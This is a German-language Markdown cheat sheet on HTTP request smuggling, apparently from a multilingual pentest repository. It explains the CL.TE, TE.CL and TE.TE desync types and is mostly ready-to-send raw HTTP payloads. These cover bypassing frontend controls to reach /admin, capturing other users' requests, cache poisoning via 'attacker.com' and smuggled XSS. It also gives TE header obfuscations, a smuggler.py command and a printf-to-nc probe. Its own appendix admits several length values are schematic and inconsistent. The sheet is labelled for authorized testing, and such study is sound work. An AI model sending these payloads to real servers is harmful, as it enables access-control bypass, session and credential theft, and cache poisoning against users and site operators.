# 📦 Cheatsheet zu HTTP Request Smuggling

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Was ist Request Smuggling?

**HTTP Request Smuggling** (Einschleusen von HTTP-Anfragen) nutzt Unterschiede bei der Verarbeitung von HTTP-Anfragen durch Frontend-Server (Proxys) und Backend-Server aus. Dadurch können zusätzliche Anfragen eingeschleust werden.

### Auswirkungen
- 🔴 **Sicherheitskontrollen umgehen** – WAFs und Zugriffslisten (ACLs) umgehen
- 🔴 **Webcache vergiften** – Schädliche Antworten im Cache ablegen
- 🔴 **Zugangsdaten stehlen** – Anfragen anderer Nutzer abfangen
- 🔴 **XSS** – Reflektierte XSS über eine eingeschleuste Anfrage

---

## 🔍 Funktionsweise

### Beteiligte Header
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Schwachstellentypen
| Typ | Frontend verwendet | Backend verwendet |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Beide verschleiert | Ein Header wird ignoriert |

---

## 💉 Angriffs-Payloads

### CL.TE (Content-Length → Transfer-Encoding)

**Das Frontend verwendet Content-Length, das Backend Transfer-Encoding.**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Ausnutzungsbeispiel:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Das Frontend verwendet Transfer-Encoding, das Backend Content-Length.**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (verschleierter Transfer-Encoding-Header)

```http
# TE-Header verschleiern
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 Beispiele zur Ausnutzung

### Sicherheitskontrollen des Frontends umgehen
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Anfragen anderer Nutzer abfangen
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*Die Anfrage des nächsten Nutzers wird an `data=` angehängt.*

### Cache Poisoning durch Request Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS durch Request Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Erkennung

### Erkennung anhand von Antwortzeiten
```http
# CL.TE-Test
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Wenn das Backend TE verwendet, wartet es auf den "0"-Chunk
# Zeitüberschreitung = möglicherweise anfällig
```

### Erkennung anhand unterschiedlicher Antworten
```http
# Eine eingeschleuste Anfrage senden, die einen 404-Status auslöst
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Wenn die nächste Antwort den Status 404 hat = anfällig
```

---

## 🛠️ Werkzeuge

### Burp-Suite-Erweiterung
```
1. Die Erweiterung "HTTP Request Smuggler" installieren
2. Rechtsklick auf die Anfrage → Extensions → Launch Smuggle Probe
3. Ergebnisse auf Request-Smuggling-Schwachstellen prüfen
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Manuelle Prüfung mit curl
```bash
# Hinweis: curl normalisiert Header; möglicherweise ist eine rohe TCP-Verbindung nötig
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Schnellübersicht

### Checkliste zur Erkennung
```markdown
- [ ] Auf Proxys/Load Balancer prüfen (mehrere Server)
- [ ] Antwortzeiten bei CL.TE prüfen
- [ ] Antwortzeiten bei TE.CL prüfen
- [ ] Verschleierung des TE-Headers prüfen
- [ ] Durch unterschiedliche Antworten bestätigen
```

### Häufige Anhaltspunkte
```
- Load Balancer (AWS ALB, HAProxy)
- Reverse Proxys (nginx, Apache)
- CDNs (Cloudflare, Akamai)
- Umsetzung von HTTP/2 auf HTTP/1.1 (Downgrade)
```

---

## ⚠️ Wichtige Hinweise

```
1. Tests können andere Nutzer beeinträchtigen
2. Wenn möglich isolierte Testumgebungen verwenden
3. Eindeutige Kennungen ergänzen, um eigene Anfragen zu erkennen
4. Ergebnisse verantwortungsvoll und mit einem Proof of Concept (PoC) melden
```

---

## 📚 Ressourcen

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Smuggler Tool](https://github.com/defparam/smuggler)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Längen und Nachrichtenformat:** Die Payloads sind schematische Originalbeispiele, keine allgemein lauffähigen Requests. Mehrere Längenangaben passen nicht ohne Weiteres zum dargestellten Inhalt. Content-Length zählt Bytes, Chunk-Größen sind hexadezimal; tatsächliche CRLF-Grenzen und Leerzeilen sind entscheidend. Die ursprünglichen Werte und Leerzeilen bleiben erhalten. [RFC 9112, Abschnitte 6.3 und 7.1](https://www.rfc-editor.org/rfc/rfc9112.html#section-6.3).
- **Header und TE.TE:** Ein Sender darf Content-Length und Transfer-Encoding nicht gemeinsam senden. Beim Empfang hat Transfer-Encoding Vorrang; solche Nachrichten sollten als Fehler behandelt werden. Die verkürzte TE.TE-Tabellenzeile meint: Beide Server unterstützen grundsätzlich Transfer-Encoding, aber nur einer ignoriert eine bestimmte verschleierte Variante. Die aufgeführten Varianten weichen teils vom vorgeschriebenen Headerformat ab. [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html#section-6.3), [PortSwigger: TE.TE](https://portswigger.net/web-security/request-smuggling#te-te-behavior-obfuscating-the-te-header).
- **Aussagekraft:** Ein Timeout oder eine einzelne 404-Antwort allein beweist keine Desynchronisierung. Maßgeblich ist die nachvollziehbare Beeinflussung einer nachfolgenden Anfrage; Routing und Verbindungswiederverwendung beeinflussen das Ergebnis. Ebenso garantieren die Beispiele keinen Datenabfluss, keine Cache-Vergiftung und keine XSS. Die genannten Produkte und ein HTTP-Downgrade sind Anhaltspunkte, kein Schwachstellennachweis. [PortSwigger: Erkennung und Bestätigung](https://portswigger.net/web-security/request-smuggling/finding).
- **Werkzeuge und Protokolle:** Der Abschnitt „Manuelle Prüfung mit curl“ zeigt tatsächlich printf mit nc und damit unverschlüsseltes TCP zu Port 80, keinen curl-Aufruf. Klassische CL.TE-/TE.CL-Beispiele betreffen HTTP/1; HTTP/2-Downgrades erfordern eine gesonderte Betrachtung. Burp-Menübezeichnungen und Erweiterungsfunktionen können je nach Version abweichen; die ursprünglichen UI-Bezeichnungen bleiben erhalten. [PortSwigger: Request Smuggling](https://portswigger.net/web-security/request-smuggling), [HTTP Request Smuggler: offizielle Anleitung](https://github.com/PortSwigger/http-request-smuggler).

---

<p align="center">
  <b>📦 Request Smuggling aufdecken!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>
